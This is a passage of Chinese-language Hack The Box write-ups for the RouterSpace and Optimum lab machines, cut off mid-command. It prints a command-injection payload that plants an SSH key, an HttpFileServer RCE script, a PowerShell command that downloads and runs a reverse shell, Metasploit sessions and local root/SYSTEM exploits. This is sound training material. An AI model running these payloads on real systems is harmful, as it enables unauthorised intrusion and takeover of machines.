7.91 ( https://nmap.org ) at 2022-02-27 21:16 EST\nNmap scan report for 10.10.11.148\nHost is up (0.28s latency).\nNot shown: 65533 filtered ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     (protocol 2.0)\n| fingerprint-strings: \n|   NULL: \n|_    SSH-2.0-RouterSpace Packet Filtering V1\n80/tcp open  http\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.1 200 OK\n|     X-Powered-By: RouterSpace\n|     X-Cdn: RouterSpace-76343\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 78\n|     ETag: W/\"4e-iLIX7S/AlC0nyhqE0lYp8aZLlm4\"\n|     Date: Mon, 28 Feb 2022 02:17:00 GMT\n|     Connection: close\n|     Suspicious activity detected !!! {RequestID: j7Q X53 Qp3 9o 7 B2JL }\n|   GetRequest: \n|     HTTP/1.1 200 OK\n|     X-Powered-By: RouterSpace\n|     X-Cdn: RouterSpace-10824\n|     Accept-Ranges: bytes\n|     Cache-Control: public, max-age=0\n|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT\n|     ETag: W/\"652c-17d476c9285\"\n|     Content-Type: text/html; charset=UTF-8\n|     Content-Length: 25900\n|     Date: Mon, 28 Feb 2022 02:16:56 GMT\n|     Connection: close\n|     <!doctype html>\n|     <html class=\"no-js\" lang=\"zxx\">\n|     <head>\n|     <meta charset=\"utf-8\">\n|     <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\">\n|     <title>RouterSpace</title>\n|     <meta name=\"description\" content=\"\">\n|     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n|     <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\">\n|     <link rel=\"stylesheet\" href=\"css/owl.carousel.min.css\">\n|     <link rel=\"stylesheet\" href=\"css/magnific-popup.css\">\n|     <link rel=\"stylesheet\" href=\"css/font-awesome.min.css\">\n|     <link rel=\"stylesheet\" href=\"css/themify-icons.css\">\n|   HTTPOptions: \n|     HTTP/1.1 200 OK\n|     X-Powered-By: RouterSpace\n|     X-Cdn: RouterSpace-97983\n|     Allow: GET,HEAD,POST\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 13\n|     ETag: W/\"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo\"\n|     Date: Mon, 28 Feb 2022 02:16:57 GMT\n|     Connection: close\n|     GET,HEAD,POST\n|   RTSPRequest, X11Probe: \n|     HTTP/1.1 400 Bad Request\n|_    Connection: close\n2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port22-TCP:V=7.91%I=7%D=2/27%Time=621C309D%P=x86_64-pc-linux-gnu%r(NULL\nSF:,29,\"SSH-2\\.0-RouterSpace\\x20Packet\\x20Filtering\\x20V1\\r\\n\");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port80-TCP:V=7.91%I=7%D=2/27%Time=621C309D%P=x86_64-pc-linux-gnu%r(GetR\nSF:equest,13E4,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\n\nSF:X-Cdn:\\x20RouterSpace-10824\\r\\nAccept-Ranges:\\x20bytes\\r\\nCache-Control\nSF::\\x20public,\\x20max-age=0\\r\\nLast-Modified:\\x20Mon,\\x2022\\x20Nov\\x20202\nSF:1\\x2011:33:57\\x20GMT\\r\\nETag:\\x20W/\\\"652c-17d476c9285\\\"\\r\\nContent-Type\nSF::\\x20text/html;\\x20charset=UTF-8\\r\\nContent-Length:\\x2025900\\r\\nDate:\\x\nSF:20Mon,\\x2028\\x20Feb\\x202022\\x2002:16:56\\x20GMT\\r\\nConnection:\\x20close\\\nSF:r\\n\\r\\n<!doctype\\x20html>\\n<html\\x20class=\\\"no-js\\\"\\x20lang=\\\"zxx\\\">\\n<\nSF:head>\\n\\x20\\x20\\x20\\x20<meta\\x20charset=\\\"utf-8\\\">\\n\\x20\\x20\\x20\\x20<me\nSF:ta\\x20http-equiv=\\\"x-ua-compatible\\\"\\x20content=\\\"ie=edge\\\">\\n\\x20\\x20\\\nSF:x20\\x20<title>RouterSpace</title>\\n\\x20\\x20\\x20\\x20<meta\\x20name=\\\"desc\nSF:ription\\\"\\x20content=\\\"\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20name=\\\"viewport\\\"\\\nSF:x20content=\\\"width=device-width,\\x20initial-scale=1\\\">\\n\\n\\x20\\x20\\x20\\\nSF:x20<link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/bootstrap\\.min\\.css\\\">\\n\\x\nSF:20\\x20\\x20\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/owl\\.carousel\\.\nSF:min\\.css\\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/\nSF:magnific-popup\\.css\\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20\nSF:href=\\\"css/font-awesome\\.min\\.css\\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"st\nSF:ylesheet\\\"\\x20href=\\\"css/themify-icons\\.css\\\">\\n\\x20\")%r(HTTPOptions,10\nSF:8,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20\nSF:RouterSpace-97983\\r\\nAllow:\\x20GET,HEAD,POST\\r\\nContent-Type:\\x20text/h\nSF:tml;\\x20charset=utf-8\\r\\nContent-Length:\\x2013\\r\\nETag:\\x20W/\\\"d-bMedpZ\nSF:YGrVt1nR4x\\+qdNZ2GqyRo\\\"\\r\\nDate:\\x20Mon,\\x2028\\x20Feb\\x202022\\x2002:16\nSF::57\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nGET,HEAD,POST\")%r(RTSPRequest\nSF:,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\nSF:\")%r(X11Probe,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20\nSF:close\\r\\n\\r\\n\")%r(FourOhFourRequest,134,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Po\nSF:wered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20RouterSpace-76343\\r\\nContent-Type\nSF::\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2078\\r\\nETag:\\x20W\nSF:/\\\"4e-iLIX7S/AlC0nyhqE0lYp8aZLlm4\\\"\\r\\nDate:\\x20Mon,\\x2028\\x20Feb\\x2020\nSF:22\\x2002:17:00\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nSuspicious\\x20acti\nSF:vity\\x20detected\\x20!!!\\x20{RequestID:\\x20j7Q\\x20\\x20X53\\x20Qp3\\x20\\x20\nSF:9o\\x207\\x20\\x20\\x20B2JL\\x20\\x20}\\n\\n\\n\\n\\n\");\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: VoIP adapter|general purpose\nRunning: Cisco embedded, Linux 2.6.X\nOS CPE: cpe:/h:cisco:unified_call_manager cpe:/o:linux:linux_kernel:2.6.26\nOS details: Cisco Unified Communications Manager VoIP adapter, Linux 2.6.26 (PCLinuxOS)\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT    ADDRESS\n1   ... 30\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 287.18 seconds\n```\n### Http\n先去看看80端口\n\n![](Hackthebox-RouterSpace/46653afc-b6b5-46bd-b82b-c4d45ae3c626.png)\n\n这似乎是一个公寓的路由管理系统\n\n先到处看看\n\n这里右上角Download会下载一个apk包，下载下来后使用模拟器运行然后burp抓包看看\n\n### Apk\n> [https://dev.to/sbellone/how-to-install-anbox-on-debian-1hjd](https://dev.to/sbellone/how-to-install-anbox-on-debian-1hjd)\n\n在Debian架构的Linux中安装AnBox模拟器的方法\n\n```bash\nanbox launch --package=org.anbox.appmgr --component=org.anbox.appmgr.AppViewActivity\n```\n安装后以后咱们启动模拟器\n\n```bash\nadb shell settings put global http_proxy 192.168.31.208:8080\n```\n然后burp设置好监听端口以后，使用burp对anbox进行代理\n\n```bash\nadb install RouterSpace.apk\n```\n安装app，然后打开\n\n![](Hackthebox-RouterSpace/1173a543-75e4-4e62-b115-cd4b3febb370.png)\n\nAPK文件运行后就只有一个查看状态的按钮，我们抓包看看\n\n![](Hackthebox-RouterSpace/dd1602d3-b569-42f1-8a54-59aed067dd37.png)\n\n```bash\nPOST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1\naccept: application/json, text/plain, */*\nuser-agent: RouterSpaceAgent\nContent-Type: application/json\nContent-Length: 16\nHost: routerspace.htb\nConnection: close\nAccept-Encoding: gzip, deflate\n\n{\"ip\":\"0.0.0.0\"}\n```\n将routerspace.htb加入到hosts\n\n```bash\necho 10.10.11.148 routerspace.htb >> /etc/hosts\n```\n抓包下来后是这么个状态，去放包看看\n\n![](Hackthebox-RouterSpace/557f8523-19ca-483b-95e1-52bd5f4d8b6b.png)\n\n这边我有个大胆的想法，看着跟DVWA的命令注入很类似，去测试一下是否可行\n\n![](Hackthebox-RouterSpace/4d7193db-f82f-4bd6-8a01-b85d71ecb73a.png)\n\n成功被执行了，那就好玩了，去构造POC拿shell吧\n\n## 漏洞利用\n![](Hackthebox-RouterSpace/9700e06d-20dc-468e-b807-33cf7ba9646d.png)\n\n尝试写入文件，但是无法执行成功\n\n试试能不能执行命令\n\n![](Hackthebox-RouterSpace/ea92e25f-0ed9-41e0-83c1-b347ef997b89.png)\n\n调用bash也失败了\n\n然后在/home/paul/.ssh/里也没有东西，但是经过测试后，.ssh里可以写入文件\n\n![](Hackthebox-RouterSpace/aaa685f4-fd92-4728-b005-399d39842443.png)\n\n这里突然就有个思路了，生成一个sshkey，然后写入进去就可以ssh登陆了\n\n```bash\nssh-keygen\n然后全部默认即可生成\n```\n然后把id\\_rsa.pub的内容保存为authorized\\_keys\n\n```bash\n{\"ip\":\"0.0.0.0|echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMxVRUf56TSx5tkTab+gCMuO3EFgbMTbNlLOhqEvLiDLcST6zbYl0ofc4cGNguoi6ti6iyi8ZHyS8DjJ89thmpTrDiYXf39Z8QhkO2DaQkzh6FjvvGgY82pVBPtRq1qL0JrnOgqhGBigs3kPbd0kkdmOmDbmV1w1p9omfk2Tj/+q469S+1IVCtQIIvtNuuGTUeTMYQdCfFLOB4OVHBLvAuucIagK2DJrJLgcf0w/DQ/9X04luqhqQET8SfQqBpfn1nq/CcJvXsMlCGqbjE4m6c5l4WIaeAtfrhUdrVukSg0x/r1OJvEm4MgevR7eN/umwGP6yQVH34eBoTHoU6P+H3+9csDAMujbSCWJi3yGK9U5Q7Rei0DsiCrd6T0qbQuCmu4bUdJZfSZCGPCSxO7LRCQlNI13RLRTTUPh6cQn7eB+bnucs/YRgx2/O4b+EDsWGEveXQTpfbJxYLMeespC95v5Rj/vl1C3zqq2nIUIqXC13Y+966+92x4Y6vVmaKDC0= root@kali' > /home/paul/.ssh/authorized_keys\"}\n```\n然后给700权限\n\n```bash\n{\"ip\":\"0.0.0.0|chmod 700 /home/paul/.ssh/authorized_keys\"}\n```\n然后使用ssh进行登陆\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh paul@10.10.11.148 -i id_rsa                         \nThe authenticity of host '10.10.11.148 (10.10.11.148)' can't be established.\nECDSA key fingerprint is SHA256:M4jDfH65U/Fw7jjmKhTZcb9LgW/gi23OjcLjM1bA5UY.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.148' (ECDSA) to the list of known hosts.\nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Thu 03 Mar 2022 11:30:25 AM UTC\n\n  System load:           0.07\n  Usage of /:            71.7% of 3.49GB\n  Memory usage:          31%\n  Swap usage:            0%\n  Processes:             214\n  Users logged in:       0\n  IPv4 address for eth0: 10.10.11.148\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:888d\n\n80 updates can be applied immediately.\n31 of these updates are standard security updates.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Wed Mar  2 22:54:39 2022 from 10.10.14.27\npaul@routerspace:~$ whoami&&id\npaul\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\n```\n成功拿到user权限\n\n```bash\npaul@routerspace:~$ ls\nsnap  user.txt\npaul@routerspace:~$ cat user.txt \na874812f3d7207b3f4ad32da4bc2bc84\n```\n成功拿到user权限的flag文件\n\n## 权限提升\n首先去跑一个linpeas.sh脚本看看有没有提权点\n\n> [https://github.com/LucifielHack/linpeas.sh/blob/main/linpeas.sh](https://github.com/LucifielHack/linpeas.sh/blob/main/linpeas.sh)\n\n```bash\n[+] Sudo version\n[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                  \nSudo version 1.8.31\n```\n跑完以后我看到了这么个东西，然后去搜索一下sudo 1.8.31的漏洞\n\n![](Hackthebox-RouterSpace/479c2cef-8cec-447e-b854-af1bfaf6830d.png)\n\n这里看到了一个漏洞CVE-2021-3156\n\n> [https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)\n\n```bash\npaul@routerspace:~/Sudo-1.8.31-Root-Exploit$ make\nmkdir libnss_x\ncc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c\ncc -O3 -o exploit exploit.c\npaul@routerspace:~/Sudo-1.8.31-Root-Exploit$ ./exploit \n# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root),1001(paul)\n```\n成功拿到root权限的flag文件\n\n```bash\n# cat /root/root.txt\nf3388fc86d949870742895a2c1d6f16e\n```\n成功拿到root权限的flag文件","tags":["Hackthebox"]},{"title":"Optimum - Hackthebox","url":"/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/","content":"\n# Hackthebox - Optimum\n## 靶场信息\n![](Hackthebox-Optimum/5cecf411-151e-4885-b215-eae21359ce0d.png)\n\n## 靶场类型\n![](Hackthebox-Optimum/9700ccb2-fc63-442b-8417-225c9ec8d507.png)\n\n## 信息搜集\n### Nmap\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Optimum]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.8            \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-09 23:06 EST\nNmap scan report for 10.10.10.8\nHost is up (0.52s latency).\nNot shown: 65534 filtered ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    HttpFileServer httpd 2.3\n|_http-server-header: HFS 2.3\n|_http-title: HFS /\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2012 (85%)\nOS CPE: cpe:/o:microsoft:windows_server_2012\nAggressive OS guesses: Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   477.43 ms 10.10.16.1\n2   477.52 ms 10.10.10.8\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 68.98 seconds\n```\n### Http\n只有一个80端口开着，去看看HTTP的内容\n\n![](Hackthebox-Optimum/4cdb23da-f556-4b4e-b977-23ab9a56774a.png)\n\n这似乎是一个文件服务器，试试有没有弱口令可以登录的\n\n![](Hackthebox-Optimum/8c342218-4e7e-4e45-a7fd-e65d001f6575.png)\n\n测试了几个弱口令，都没登录进去，看看其他方法\n\n这里可以看到有一个HttpFileServer 2.3，去searchsploit一下看看有没有相关的漏洞\n\n### Searchsploit\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Optimum]\n└─# searchsploit HttpFileServer 2.3\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nRejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                                       | windows/webapps/49125.py\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\n这里确实有一个RCE，测试一下是否可用\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Optimum]\n└─# cat CVE-2014-6287.py \n# Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)\n# Google Dork: intext:\"httpfileserver 2.3\"\n# Date: 28-11-2020\n# Remote: Yes\n# Exploit Author: Óscar Andreu\n# Vendor Homepage: http://rejetto.com/\n# Software Link: http://sourceforge.net/projects/hfs/\n# Version: 2.3.x\n# Tested on: Windows Server 2008 , Windows 8, Windows 7\n# CVE : CVE-2014-6287\n\n#!/usr/bin/python3\n\n# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command>\n# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 \"c:\\windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')\"\n\nimport urllib3\nimport sys\nimport urllib.parse\n\ntry:\n        http = urllib3.PoolManager()\n        url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}'\n        print(url)\n        response = http.request('GET', url)\n\nexcept Exception as ex:\n        print(\"Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command\")\n        print(ex)\n```\n尝试执行一下\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Optimum]\n└─# python3 CVE-2014-6287.py 10.10.10.8 80 whoami\nhttp://10.10.10.8:80/?search=%00{.+exec|whoami.}\n```\n这里没有给我任何回显，我不确定是否执行成功了，去测试一下吧\n\n本地使用tcpdump监听一下网卡，然后执行一下ping我们自己的命令\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Optimum]\n└─# python3 CVE-2014-6287.py 10.10.10.8 80 \"ping 10.10.16.3\"\nhttp://10.10.10.8:80/?search=%00{.+exec|ping%2010.10.16.3.}\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# tcpdump -i tun0     \ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes\n23:25:22.516278 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [S], seq 2814804000, win 64240, options [mss 1460,sackOK,TS val 3571996960 ecr 0,nop,wscale 7], length 0\n23:25:22.747740 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [S.], seq 3736611079, ack 2814804001, win 8192, options [mss 1355,nop,wscale 8,sackOK,TS val 122838 ecr 3571996960], length 0\n23:25:22.747788 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 3571997191 ecr 122838], length 0\n23:25:22.747968 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [P.], seq 1:143, ack 1, win 502, options [nop,nop,TS val 3571997191 ecr 122838], length 142: HTTP: GET /?search=%00%7B.+exec%7Cping%2010.10.16.3.%7D HTTP/1.1\n23:25:23.203303 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [P.], seq 1:219, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 218: HTTP: HTTP/1.1 200 OK\n23:25:23.203352 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 219, win 501, options [nop,nop,TS val 3571997647 ecr 122884], length 0\n23:25:23.203376 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [.], seq 219:1562, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1343: HTTP\n23:25:23.203381 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 1562, win 498, options [nop,nop,TS val 3571997647 ecr 122884], length 0\n23:25:23.204028 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [P.], seq 1562:1679, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 117: HTTP\n23:25:23.204036 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 1679, win 501, options [nop,nop,TS val 3571997647 ecr 122884], length 0\n23:25:23.434280 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [.], seq 1679:3022, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1343: HTTP\n23:25:23.434317 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 3022, win 501, options [nop,nop,TS val 3571997878 ecr 122884], length 0\n23:25:23.434339 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [P.], seq 3022:3139, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 117: HTTP\n23:25:23.434346 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 3139, win 501, options [nop,nop,TS val 3571997878 ecr 122884], length 0\n23:25:23.434354 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [P.], seq 3139:4164, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1025: HTTP\n23:25:23.434359 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 4164, win 498, options [nop,nop,TS val 3571997878 ecr 122884], length 0\n23:25:23.437193 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [F.], seq 143, ack 4164, win 501, options [nop,nop,TS val 3571997881 ecr 122884], length 0\n23:25:23.879455 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [.], ack 144, win 257, options [nop,nop,TS val 122953 ecr 3571997881], length 0\n23:25:24.151025 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [F.], seq 4164, ack 144, win 257, options [nop,nop,TS val 122953 ecr 3571997881], length 0\n23:25:24.151044 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 4165, win 501, options [nop,nop,TS val 3571998595 ecr 122953], length 0\n23:25:47.421881 IP 10.10.16.3.33237 > 239.255.255.250.1900: UDP, length 172\n23:25:48.422841 IP 10.10.16.3.33237 > 239.255.255.250.1900: UDP, length 172\n23:25:49.424354 IP 10.10.16.3.33237 > 239.255.255.250.1900: UDP, length 172\n23:25:50.425946 IP 10.10.16.3.33237 > 239.255.255.250.1900: UDP, length 172\n```\n确实是成功被执行了，那就可以确认该漏洞是存在，并且exploit也是可以使用的\n\n## 漏洞利用\n### 方法 1\n既然知道了什么漏洞可以用，那就简单了，来构造POC吧\n\n根据CVE-2014-6287的提示，这里应该是使用powershell进行回弹一个shell，咱们找一个powershell的利用工具\n\n> [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)\n\n我这边是找到一个脚本，咱们给下载下来，然后去尝试执行\n\n然后稍微修改一下\n\n```bash\nInvoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444\n```\n我们将这句代码复制下来，粘贴到代码最底部，然后把IP修改为我们自己的IP\n\n然后在本地使用python3开启一个http服务\n\n```bash\npython3 -m http.server 80\n```\n然后使用exp进行下载\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Optimum]\n└─# python3 CVE-2014-6287.py 10.10.10.8 80 \"c:\\windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.3/Invoke-PowerShellTcp.ps1')\"\nhttp://10.10.10.8:80/?search=%00{.+exec|c%3A%5Cwindows%5CSysNative%5CWindowsPowershell%5Cv1.0%5Cpowershell.exe%20IEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//10.10.16.3/Invoke-PowerShellTcp.ps1%27%29.}\n```\n```bash\nPS C:\\Users\\kostas\\Desktop> whoami\noptimum\\kostas\n```\n成功得到了shell\n\n### 方法 2\n```bash\nmsf6 > search HttpFileServer 2.3\n\nMatching Modules\n================\n\n   #  Name                                   Disclosure Date  Rank       Check  Description\n   -  ----                                   ---------------  ----       -----  -----------\n   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution\n\nInteract with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec\n\nmsf6 > use 0\n[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp\nmsf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\n```\nmsfconsole可以直接使用\n\n```bash\nmsf6 exploit(windows/http/rejetto_hfs_exec) > show options \n\nModule options (exploit/windows/http/rejetto_hfs_exec):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   HTTPDELAY  10               no        Seconds to wait before terminating web server\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     10.10.10.8       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT      80               yes       The target port (TCP)\n   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.\n   SRVPORT    8080             yes       The local port to listen on.\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI  /                yes       The path of the web application\n   URIPATH                     no        The URI to use for this exploit (default is random)\n   VHOST                       no        HTTP server virtual host\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.3       yes       The listen address (an interface may be specified)\n   LPORT     5555             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n```\n设置好相关配置，然后执行\n\n```bash\nmsf6 exploit(windows/http/rejetto_hfs_exec) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.3:5555 \n[*] Using URL: http://0.0.0.0:8080/zKFWDMqMmVKxA\n[*] Local IP: http://192.168.200.128:8080/zKFWDMqMmVKxA\n[*] Server started.\n[*] Sending a malicious request to /\n[*] Payload request received: /zKFWDMqMmVKxA\n[*] Sending stage (175174 bytes) to 10.10.10.8\n[!] Tried to delete %TEMP%\\UZMLMeDqW.vbs, unknown result\n[*] Meterpreter session 1 opened (10.10.16.3:5555 -> 10.10.10.8:49178) at 2022-03-10 00:02:29 -0500\n[*] Server stopped.\n\nmeterpreter > getuid\nServer username: OPTIMUM\\kostas\nmeterpreter > sysinfo\nComputer        : OPTIMUM\nOS              : Windows 2012 R2 (6.3 Build 9600).\nArchitecture    : x64\nSystem Language : el_GR\nDomain          : HTB\nLogged On Users : 1\nMeterpreter     : x86/windows\n```\n这边也成功拿到了shell\n\n## 权限提升\n使用systeminfo或其他方式都可以看到补丁信息\n\n去搜查补丁信息，或是使用msf的提权辅助脚本都可以知道\n\n这边MSF有个提权可用脚本\n\n```bash\nuse windows/local/ms16_032_secondary_logon_handle_privesc\nset SESSION 1\nexploit\n```\n```bash\nmsf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.3:4444 \n[+] Compressed size: 1016\n[*] Writing payload file, C:\\Users\\kostas\\AppData\\Local\\Temp\\IQyTwKukUqs.ps1...\n[*] Compressing script contents...\n[+] Compressed size: 3588\n[*] Executing exploit script...\n         __ __ ___ ___   ___     ___ ___ ___ \n        |  V  |  _|_  | |  _|___|   |_  |_  |\n        |     |_  |_| |_| . |___| | |_  |  _|\n        |_|_|_|___|_____|___|   |___|___|___|\n\n                       [by b33f -> @FuzzySec]\n\n[?] Operating system core count: 2\n[>] Duplicating CreateProcessWithLogonW handle\n[?] Done, using thread handle: 1936\n\n[*] Sniffing out privileged impersonation token..\n\n[?] Thread belongs to: svchost\n[+] Thread suspended\n[>] Wiping current impersonation token\n[>] Building SYSTEM impersonation token\n[?] Success, open SYSTEM token handle: 2024\n[+] Resuming thread..\n\n[*] Sniffing out SYSTEM shell..\n\n[>] Duplicating SYSTEM token\n[>] Starting token race\n[>] Starting process race\n[!] Holy handle leak Batman, we have a SYSTEM shell!!\n\nxQiD0FWfxy0Q3rUwptuxobxZ7Fk20m8U\n[+] Executed on target machine.\n[*] Sending stage (200262 bytes) to 10.10.10.8\n[*] Meterpreter session 2 opened (10.10.16.3:4444 -> 10.10.10.8:49188) at 2022-03-10 00:34:05 -0500\n[+] Deleted C:\\Users\\kostas\\AppData\\Local\\Temp\\IQyTwKukUqs.ps1\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n```\n成功拿到system权限\n\n```bash\nmeterpreter > search -f user.txt.txt\nFound 1 result...\n    c:\\Users\\kostas\\Desktop\\user.txt.txt (32 bytes)\nmeterpreter > cat 